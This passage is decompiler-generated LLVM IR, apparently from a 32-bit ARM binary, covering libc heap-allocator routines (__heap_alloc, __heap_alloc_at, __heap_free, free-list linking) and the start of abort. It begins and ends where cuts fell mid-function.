  uselistorder i32 %v0_15bb0, { 1, 2, 0 }
  uselistorder i32 %v3_15b28, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_26398.966, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_26398.966 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_15bf0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_15ba8, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_15b1c, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_15c08 = inttoptr i32 %arg2 to i32*
  %v2_15c08 = load i32, i32* %v1_15c08, align 4
  %v3_15c0c = load i32, i32* @r4, align 4
  store i32 %v3_15c0c, i32* %stack_var_-8, align 4
  %v1_15c10 = add i32 %v2_15c08, 3
  %v1_15c14 = and i32 %v1_15c10, -4
  store i32 %v1_15c14, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_15c1c = icmp ugt i32 %v1_15c14, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_15c24 = load i32, i32* %arg1, align 4
  store i32 %v2_15c24, i32* %r0.global-to-local, align 4
  br i1 %v2_15c1c, label %dec_label_pc_15c90.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15c90.preheader

dec_label_pc_15c90.preheader:                     ; preds = %entry, %bb
  %v1_15c44 = phi i32 [ %v1_15c14, %entry ], [ 12, %bb ]
  %v2_15c909 = icmp eq i32 %v2_15c24, 0
  br i1 %v2_15c909, label %dec_label_pc_15c98, label %dec_label_pc_15c30

dec_label_pc_15c30:                               ; preds = %dec_label_pc_15c90.preheader, %dec_label_pc_15c8c
  %v2_15c48 = phi i32 [ %v3_15c8c, %dec_label_pc_15c8c ], [ %v2_15c24, %dec_label_pc_15c90.preheader ]
  %v1_15c30 = inttoptr i32 %v2_15c48 to i32*
  %v2_15c30 = load i32, i32* %v1_15c30, align 4
  store i32 %v2_15c30, i32* @ip, align 4
  %v3_15c34 = icmp ult i32 %v2_15c30, %v1_15c44
  br i1 %v3_15c34, label %dec_label_pc_15c8c, label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %dec_label_pc_15c30
  %v1_15c3c = add i32 %v1_15c44, 44
  %v3_15c40 = icmp ult i32 %v2_15c30, %v1_15c3c
  br i1 %v3_15c40, label %dec_label_pc_15c50, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_15c3c
  %v2_15c34.le = sub i32 %v2_15c30, %v1_15c44
  store i32 %v2_15c34.le, i32* %v1_15c30, align 4
  %v0_15c7c.pre = load i32, i32* @ip, align 4
  %v0_15c84.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_15c50:                               ; preds = %dec_label_pc_15c3c
  %v1_15c50 = add i32 %v2_15c48, 4
  %v2_15c50 = inttoptr i32 %v1_15c50 to i32*
  %v3_15c50 = load i32, i32* %v2_15c50, align 4
  store i32 %v3_15c50, i32* %r2.global-to-local, align 4
  %v2_15c54 = icmp eq i32 %v3_15c50, 0
  br i1 %v2_15c54, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_15c50
  %v2_15c58 = add i32 %v2_15c48, 8
  %v3_15c58 = inttoptr i32 %v2_15c58 to i32*
  %v4_15c58 = load i32, i32* %v3_15c58, align 4
  %v3_15c5c = add i32 %v3_15c50, 8
  %v4_15c5c = inttoptr i32 %v3_15c5c to i32*
  store i32 %v4_15c58, i32* %v4_15c5c, align 4
  %v0_15c60.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15c50, %bb27
  %v0_15c60 = phi i32 [ %v2_15c48, %dec_label_pc_15c50 ], [ %v0_15c60.pre, %bb27 ]
  %v1_15c60 = add i32 %v0_15c60, 8
  %v2_15c60 = inttoptr i32 %v1_15c60 to i32*
  %v3_15c60 = load i32, i32* %v2_15c60, align 4
  %v1_15c64 = add i32 %v0_15c60, 4
  %v2_15c64 = inttoptr i32 %v1_15c64 to i32*
  %v3_15c64 = load i32, i32* %v2_15c64, align 4
  %v2_15c68 = icmp eq i32 %v3_15c60, 0
  br i1 %v2_15c68, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_15c6c = add i32 %v3_15c60, 4
  %v4_15c6c = inttoptr i32 %v3_15c6c to i32*
  store i32 %v3_15c64, i32* %v4_15c6c, align 4
  %v1_15c74 = load i32, i32* @ip, align 4
  store i32 %v1_15c74, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_15c70 = load i32, i32* %r1.global-to-local, align 4
  %v3_15c70 = inttoptr i32 %v2_15c70 to i32*
  store i32 %v3_15c64, i32* %v3_15c70, align 4
  %v1_15c78.pre = load i32, i32* @ip, align 4
  store i32 %v1_15c78.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_15c84 = phi i32 [ %v0_15c84.pre, %.thread._crit_edge ], [ %v1_15c74, %bb28 ], [ %v1_15c78.pre, %.thread5 ]
  %v0_15c7c = phi i32 [ %v0_15c7c.pre, %.thread._crit_edge ], [ %v1_15c74, %bb28 ], [ %v1_15c78.pre, %.thread5 ]
  %v1_15c7c = load i32, i32* %r0.global-to-local, align 4
  %v2_15c7c = sub i32 %v1_15c7c, %v0_15c7c
  %v1_15c80 = add i32 %v2_15c7c, 12
  store i32 %v1_15c80, i32* %r0.global-to-local, align 4
  %v1_15c84 = load i32, i32* %r4.global-to-local, align 4
  %v2_15c84 = inttoptr i32 %v1_15c84 to i32*
  store i32 %v0_15c84, i32* %v2_15c84, align 4
  %v2_15c88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15c88, i32* %r4.global-to-local, align 4
  ret i32 %v1_15c80

dec_label_pc_15c8c:                               ; preds = %dec_label_pc_15c30
  %v1_15c8c = add i32 %v2_15c48, 4
  %v2_15c8c = inttoptr i32 %v1_15c8c to i32*
  %v3_15c8c = load i32, i32* %v2_15c8c, align 4
  store i32 %v3_15c8c, i32* %r0.global-to-local, align 4
  %v2_15c90 = icmp eq i32 %v3_15c8c, 0
  br i1 %v2_15c90, label %dec_label_pc_15c90.dec_label_pc_15c98_crit_edge, label %dec_label_pc_15c30

dec_label_pc_15c90.dec_label_pc_15c98_crit_edge:  ; preds = %dec_label_pc_15c8c
  br label %dec_label_pc_15c98

dec_label_pc_15c98:                               ; preds = %dec_label_pc_15c90.dec_label_pc_15c98_crit_edge, %dec_label_pc_15c90.preheader
  store i32 %v3_15c0c, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_15c8c, { 1, 2, 0 }
  uselistorder i32 %v0_15c60, { 1, 0 }
  uselistorder i32 %v2_15c30, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15c48, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_15c44, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15c30, { 1, 0 }
  uselistorder label %dec_label_pc_15c90.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_15ca0 = load i32, i32* %arg1, align 4
  store i32 %v2_15ca0, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_15d186 = icmp eq i32 %v2_15ca0, 0
  br i1 %v2_15d186, label %dec_label_pc_15d20, label %dec_label_pc_15cac

dec_label_pc_15cac:                               ; preds = %entry, %dec_label_pc_15d14
  %v0_15cec = phi i32 [ %v3_15d14, %dec_label_pc_15d14 ], [ %v2_15ca0, %entry ]
  %v1_15cac = inttoptr i32 %v0_15cec to i32*
  %v2_15cac = load i32, i32* %v1_15cac, align 4
  store i32 %v2_15cac, i32* %r0.global-to-local, align 4
  %v2_15cb0 = sub i32 %v0_15cec, %v2_15cac
  %v1_15cb4 = add i32 %v2_15cb0, 12
  %v3_15cb8 = icmp uge i32 %v1_15cb4, %arg2
  %v9_15cb8 = icmp eq i32 %v1_15cb4, %arg2
  %v2_15cbc = xor i1 %v9_15cb8, true
  %v3_15cbc = and i1 %v3_15cb8, %v2_15cbc
  br i1 %v3_15cbc, label %dec_label_pc_15d14, label %dec_label_pc_15cc0

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15cac
  br i1 %v9_15cb8, label %dec_label_pc_15cc4, label %dec_label_pc_15d20

dec_label_pc_15cc4:                               ; preds = %dec_label_pc_15cc0
  %v1_15cc4 = add i32 %arg3, 3
  %v1_15cc8 = and i32 %v1_15cc4, -4
  store i32 %v1_15cc8, i32* %r2.global-to-local, align 4
  %v2_15ccc = sub i32 %v2_15cac, %v1_15cc8
  %v3_15ccc = icmp ult i32 %v2_15cac, %v1_15cc8
  br i1 %v3_15ccc, label %dec_label_pc_15d20, label %dec_label_pc_15cd4

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15cc4
  %v1_15cd4 = add i32 %v1_15cc8, 44
  %v3_15cd8 = icmp ult i32 %v2_15cac, %v1_15cd4
  br i1 %v3_15cd8, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_15cd4
  store i32 %v2_15ccc, i32* %v1_15cac, align 4
  %v1_15ce4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_15ce4, i32* %r0.global-to-local, align 4
  ret i32 %v1_15ce4

.thread2:                                         ; preds = %dec_label_pc_15cd4
  %v1_15cec = add i32 %v0_15cec, 4
  %v2_15cec = inttoptr i32 %v1_15cec to i32*
  %v3_15cec = load i32, i32* %v2_15cec, align 4
  store i32 %v3_15cec, i32* %r2.global-to-local, align 4
  %v2_15cf0 = icmp eq i32 %v3_15cec, 0
  br i1 %v2_15cf0, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_15cf4 = add i32 %v0_15cec, 8
  %v3_15cf4 = inttoptr i32 %v2_15cf4 to i32*
  %v4_15cf4 = load i32, i32* %v3_15cf4, align 4
  %v3_15cf8 = add i32 %v3_15cec, 8
  %v4_15cf8 = inttoptr i32 %v3_15cf8 to i32*
  store i32 %v4_15cf4, i32* %v4_15cf8, align 4
  %v0_15cfc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_15cfc = phi i32 [ %v0_15cec, %.thread2 ], [ %v0_15cfc.pre, %bb17 ]
  %v1_15cfc = add i32 %v0_15cfc, 8
  %v2_15cfc = inttoptr i32 %v1_15cfc to i32*
  %v3_15cfc = load i32, i32* %v2_15cfc, align 4
  store i32 %v3_15cfc, i32* %r2.global-to-local, align 4
  %v1_15d00 = add i32 %v0_15cfc, 4
  %v2_15d00 = inttoptr i32 %v1_15d00 to i32*
  %v3_15d00 = load i32, i32* %v2_15d00, align 4
  %v2_15d04 = icmp eq i32 %v3_15cfc, 0
  br i1 %v2_15d04, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_15d08 = add i32 %v3_15cfc, 4
  %v4_15d08 = inttoptr i32 %v3_15d08 to i32*
  store i32 %v3_15d00, i32* %v4_15d08, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_15d0c = load i32, i32* %lr.global-to-local, align 4
  %v3_15d0c = inttoptr i32 %v2_15d0c to i32*
  store i32 %v3_15d00, i32* %v3_15d0c, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_15d10 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_15d10

dec_label_pc_15d14:                               ; preds = %dec_label_pc_15cac
  %v1_15d14 = add i32 %v0_15cec, 4
  %v2_15d14 = inttoptr i32 %v1_15d14 to i32*
  %v3_15d14 = load i32, i32* %v2_15d14, align 4
  store i32 %v3_15d14, i32* %ip.global-to-local, align 4
  %v2_15d18 = icmp eq i32 %v3_15d14, 0
  br i1 %v2_15d18, label %dec_label_pc_15d18.dec_label_pc_15d20.loopexit_crit_edge, label %dec_label_pc_15cac

dec_label_pc_15d18.dec_label_pc_15d20.loopexit_crit_edge: ; preds = %dec_label_pc_15d14
  br label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15cc4, %entry, %dec_label_pc_15d18.dec_label_pc_15d20.loopexit_crit_edge, %dec_label_pc_15cc0
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_15d14, { 1, 2, 0 }
  uselistorder i32 %v0_15cfc, { 1, 0 }
  uselistorder i32 %v1_15cc8, { 0, 2, 1, 3 }
  uselistorder i1 %v9_15cb8, { 1, 0 }
  uselistorder i32 %v2_15cac, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_15cec, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_15d20, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15cac, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_15d28 = load i32, i32* @r2, align 4
  %v2_15d28 = icmp eq i32 %v0_15d28, 0
  %v0_15d2c = load i32, i32* @r3, align 4
  %v1_15d2c = load i32, i32* @r1, align 4
  %v2_15d2c = add i32 %v1_15d2c, 4
  %v3_15d2c = inttoptr i32 %v2_15d2c to i32*
  store i32 %v0_15d2c, i32* %v3_15d2c, align 4
  %v0_15d30 = load i32, i32* @r2, align 4
  %v1_15d30 = load i32, i32* @r1, align 4
  %v2_15d30 = add i32 %v1_15d30, 8
  %v3_15d30 = inttoptr i32 %v2_15d30 to i32*
  store i32 %v0_15d30, i32* %v3_15d30, align 4
  %v1_15d38 = load i32, i32* @r1, align 4
  br i1 %v2_15d28, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_15d34 = load i32, i32* @r2, align 4
  %v3_15d34 = add i32 %v2_15d34, 4
  %v4_15d34 = inttoptr i32 %v3_15d34 to i32*
  store i32 %v1_15d38, i32* %v4_15d34, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_15d38 = load i32, i32* @r0, align 4
  %v3_15d38 = inttoptr i32 %v2_15d38 to i32*
  store i32 %v1_15d38, i32* %v3_15d38, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_15d3c = load i32, i32* @r3, align 4
  %v2_15d3c = icmp eq i32 %v0_15d3c, 0
  br i1 %v2_15d3c, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_15d40 = load i32, i32* @r1, align 4
  %v3_15d40 = add i32 %v0_15d3c, 8
  %v4_15d40 = inttoptr i32 %v3_15d40 to i32*
  store i32 %v1_15d40, i32* %v4_15d40, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_15d44 = load i32, i32* @r0, align 4
  ret i32 %v1_15d44

; uselistorder directives
  uselistorder i32 %v1_15d38, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_15d48 = load i32, i32* @r2, align 4
  %v2_15d48 = icmp eq i32 %v0_15d48, 0
  %v1_15d4c = load i32, i32* @r1, align 4
  br i1 %v2_15d48, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_15d4c = load i32, i32* @r0, align 4
  %v3_15d4c = inttoptr i32 %v2_15d4c to i32*
  store i32 %v1_15d4c, i32* %v3_15d4c, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_15d50 = add i32 %v0_15d48, 4
  %v4_15d50 = inttoptr i32 %v3_15d50 to i32*
  store i32 %v1_15d4c, i32* %v4_15d50, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_15d54 = load i32, i32* @r2, align 4
  %v1_15d54 = load i32, i32* @r1, align 4
  %v2_15d54 = add i32 %v1_15d54, 8
  %v3_15d54 = inttoptr i32 %v2_15d54 to i32*
  store i32 %v0_15d54, i32* %v3_15d54, align 4
  %v1_15d58 = load i32, i32* @r0, align 4
  ret i32 %v1_15d58

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15d5c = load i32, i32* @r4, align 4
  store i32 %v3_15d5c, i32* %stack_var_-20, align 4
  %v2_15d60 = load i32, i32* %arg1, align 4
  store i32 %v2_15d60, i32* %r4.global-to-local, align 4
  %v2_15d64 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_15d802 = icmp eq i32 %v2_15d60, 0
  br i1 %v2_15d802, label %dec_label_pc_15e30, label %dec_label_pc_15d70

dec_label_pc_15d70:                               ; preds = %entry, %dec_label_pc_15d78
  %v0_15dc0 = phi i32 [ %v0_15dc8, %dec_label_pc_15d78 ], [ 0, %entry ]
  %v0_15dc8 = phi i32 [ %v3_15d7c, %dec_label_pc_15d78 ], [ %v2_15d60, %entry ]
  %v1_15d845.in = phi i32 [ %v3_15d7c, %dec_label_pc_15d78 ], [ %v2_15d60, %entry ]
  %v1_15d845 = add i32 %v1_15d845.in, 12
  %v3_15d70 = icmp ult i32 %v1_15d845, %arg2
  br i1 %v3_15d70, label %dec_label_pc_15d78, label %dec_label_pc_15d90

dec_label_pc_15d78:                               ; preds = %dec_label_pc_15d70
  store i32 %v0_15dc8, i32* %r6.global-to-local, align 4
  %v1_15d7c = add i32 %v0_15dc8, 4
  %v2_15d7c = inttoptr i32 %v1_15d7c to i32*
  %v3_15d7c = load i32, i32* %v2_15d7c, align 4
  store i32 %v3_15d7c, i32* %r4.global-to-local, align 4
  %v2_15d80 = icmp eq i32 %v3_15d7c, 0
  br i1 %v2_15d80, label %dec_label_pc_15d80.dec_label_pc_15e30.loopexit_crit_edge, label %dec_label_pc_15d70

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d70
  %v1_15d90 = inttoptr i32 %v0_15dc8 to i32*
  %v2_15d90 = load i32, i32* %v1_15d90, align 4
  store i32 %v2_15d90, i32* @ip, align 4
  %v2_15d94 = sub i32 %v0_15dc8, %v2_15d90
  %v1_15d98 = add i32 %v2_15d94, 12
  %v3_15d9c = icmp uge i32 %v1_15d98, %v2_15d64
  %v9_15d9c = icmp eq i32 %v1_15d98, %v2_15d64
  %v2_15da0 = xor i1 %v9_15d9c, true
  %v3_15da0 = and i1 %v3_15d9c, %v2_15da0
  br i1 %v3_15da0, label %dec_label_pc_15e30, label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d90
  %v2_15da4 = add i32 %v2_15d90, %arg3
  store i32 %v2_15da4, i32* %r7.global-to-local, align 4
  br i1 %v9_15d9c, label %dec_label_pc_15dac, label %dec_label_pc_15dd8

dec_label_pc_15dac:                               ; preds = %dec_label_pc_15da4
  %v2_15dac = icmp eq i32 %v0_15dc0, 0
  br i1 %v2_15dac, label %dec_label_pc_15e24, label %dec_label_pc_15db4

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15dac
  %v1_15db4 = add i32 %v0_15dc0, 12
  %v9_15db8 = icmp eq i32 %v1_15db4, %arg2
  br i1 %v9_15db8, label %dec_label_pc_15dc0, label %dec_label_pc_15e24

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15db4
  %v1_15dc0 = inttoptr i32 %v0_15dc0 to i32*
  %v2_15dc0 = load i32, i32* %v1_15dc0, align 4
  %v1_15dc4 = add i32 %v0_15dc0, 8
  %v2_15dc4 = inttoptr i32 %v1_15dc4 to i32*
  %v3_15dc4 = load i32, i32* %v2_15dc4, align 4
  store i32 %v3_15dc4, i32* @r2, align 4
  store i32 %v0_15dc8, i32* @r1, align 4
  %v2_15dcc = add i32 %v2_15dc0, %v2_15da4
  store i32 %v2_15dcc, i32* %r7.global-to-local, align 4
  %v0_15dd0 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_15e24

dec_label_pc_15dd8:                               ; preds = %dec_label_pc_15da4
  %v1_15dd8 = add i32 %v0_15dc8, 4
  %v2_15dd8 = inttoptr i32 %v1_15dd8 to i32*
  %v3_15dd8 = load i32, i32* %v2_15dd8, align 4
  store i32 %v3_15dd8, i32* %r5.global-to-local, align 4
  %v2_15ddc = icmp eq i32 %v3_15dd8, 0
  br i1 %v2_15ddc, label %dec_label_pc_15e10, label %dec_label_pc_15de4

dec_label_pc_15de4:                               ; preds = %dec_label_pc_15dd8
  %v1_15de4 = inttoptr i32 %v3_15dd8 to i32*
  %v2_15de4 = load i32, i32* %v1_15de4, align 4
  store i32 %v2_15de4, i32* @ip, align 4
  %v2_15de8 = sub i32 %v3_15dd8, %v2_15de4
  %v1_15dec = add i32 %v2_15de8, 12
  %v9_15df0 = icmp eq i32 %v2_15d64, %v1_15dec
  br i1 %v9_15df0, label %dec_label_pc_15df8, label %dec_label_pc_15e10

dec_label_pc_15df8:                               ; preds = %dec_label_pc_15de4
  store i32 %v0_15dc0, i32* @r2, align 4
  store i32 %v3_15dd8, i32* @r1, align 4
  %v2_15e00 = add i32 %v2_15de4, %v2_15da4
  store i32 %v2_15e00, i32* %r7.global-to-local, align 4
  %v0_15e04 = call i32 @__heap_link_free_area_after()
  %v0_15e08 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15e08, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15e24

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15de4, %dec_label_pc_15dd8
  %v2_15e10 = add i32 %v0_15dc8, %arg3
  store i32 %v2_15e10, i32* %r4.global-to-local, align 4
  store i32 %v3_15dd8, i32* @r3, align 4
  store i32 %v0_15dc0, i32* @r2, align 4
  store i32 %v2_15e10, i32* @r1, align 4
  %v0_15e20 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_15e24

dec_label_pc_15e24:                               ; preds = %dec_label_pc_15db4, %dec_label_pc_15dac, %dec_label_pc_15df8, %dec_label_pc_15dc0, %dec_label_pc_15e10
  %v0_15e24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15e24, i32* %r5.global-to-local, align 4
  %v0_15e28 = load i32, i32* %r7.global-to-local, align 4
  %v2_15e28 = inttoptr i32 %v0_15e24 to i32*
  store i32 %v0_15e28, i32* %v2_15e28, align 4
  br label %dec_label_pc_15e48

dec_label_pc_15d80.dec_label_pc_15e30.loopexit_crit_edge: ; preds = %dec_label_pc_15d78
  br label %dec_label_pc_15e30

dec_label_pc_15e30:                               ; preds = %entry, %dec_label_pc_15d80.dec_label_pc_15e30.loopexit_crit_edge, %dec_label_pc_15d90
  %v1_15e30 = add i32 %v2_15d64, -12
  store i32 %v1_15e30, i32* %r5.global-to-local, align 4
  %v3_15e34 = inttoptr i32 %v1_15e30 to i32*
  store i32 %arg3, i32* %v3_15e34, align 4
  %v0_15e38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15e38, i32* @r3, align 4
  %v0_15e3c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15e3c, i32* @r2, align 4
  %v0_15e40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15e40, i32* @r1, align 4
  %v0_15e44 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_15e48

dec_label_pc_15e48:                               ; preds = %dec_label_pc_15e24, %dec_label_pc_15e30
  %v0_15e48 = load i32, i32* %r5.global-to-local, align 4
  %v2_15e4c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15e4c, i32* @r4, align 4
  ret i32 %v0_15e48

; uselistorder directives
  uselistorder i32 %v3_15dd8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_15d9c, { 1, 0 }
  uselistorder i32 %v3_15d7c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_15dc8, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_15dc0, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15e48, { 1, 0 }
  uselistorder label %dec_label_pc_15e30, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15e24, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15d70, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_15e6c.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_15e50 = ptrtoint i32* %stack_var_-268 to i32
  %v1_15e60 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_15e6c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_15e6c

dec_label_pc_15e6c:                               ; preds = %dec_label_pc_15e6c.lr.ph, %dec_label_pc_15e6c
  %v1_15e70 = phi i32 [ 31, %dec_label_pc_15e6c.lr.ph ], [ %v1_15e7c, %dec_label_pc_15e6c ]
  %v4_15e70 = mul i32 %v1_15e70, 4
  %v5_15e70 = add i32 %v4_15e70, %v2_15e6c
  %v2_15e78 = add i32 %v5_15e70, -128
  %v3_15e78 = inttoptr i32 %v2_15e78 to i32*
  store i32 0, i32* %v3_15e78, align 4
  %v0_15e7c = load i32, i32* %r1.global-to-local, align 4
  %v1_15e7c = add i32 %v0_15e7c, -1
  store i32 %v1_15e7c, i32* %r1.global-to-local, align 4
  %v6_15e7c = icmp slt i32 %v1_15e7c, 0
  br i1 %v6_15e7c, label %dec_label_pc_15e84, label %dec_label_pc_15e6c

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e6c
  %v2_15e84 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_15e84, i32* @r4, align 4
  store i32 %v2_15e84, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_15e90 = call i32 @__sigaddset()
  %v2_15e94 = icmp eq i32 %v0_15e90, 0
  br i1 %v2_15e94, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15e84
  store i32 %v2_15e84, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15e84, %bb
  store i32 89768, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15e94, i32 ptrtoint (i32* @global_var_12cc8.986 to i32))
  %v2_15eac = load i32, i32* @global_var_2c800.988, align 4
  %v2_15eb0 = icmp eq i32 %v2_15eac, 0
  br i1 %v2_15eb0, label %dec_label_pc_15eb8, label %dec_label_pc_15ee8

dec_label_pc_15eb8:                               ; preds = %.thread1
  store i32 1, i32* @global_var_2c800.988, align 4
  br label %dec_label_pc_15ec0

dec_label_pc_15ec0:                               ; preds = %dec_label_pc_15f38, %dec_label_pc_15eb8
  store i32 89808, i32* @lr, align 4
  %v1_15ecc = call i32 @__pthread_return_0()
  %v1_15ed4 = call i32 @__raise(i32 6)
  store i32 89832, i32* @lr, align 4
  %v1_15ee4 = call i32 @__pthread_return_0()
  %v2_15eec.pre = load i32, i32* @global_var_2c800.988, align 4
  br label %dec_label_pc_15ee8

dec_label_pc_15ee8:                               ; preds = %.thread1, %dec_label_pc_15ec0
  %v0_15f5c = phi i32 [ %v2_15eac, %.thread1 ], [ %v2_15eec.pre, %dec_label_pc_15ec0 ]
  store i32 ptrtoint (i32* @global_var_2c800.988 to i32), i32* %ip.global-to-local, align 4
  %v7_15ef0 = icmp eq i32 %v0_15f5c, 1
  br i1 %v7_15ef0, label %dec_label_pc_15f20.lr.ph, label %dec_label_pc_15f54

dec_label_pc_15f20.lr.ph:                         ; preds = %dec_label_pc_15ee8
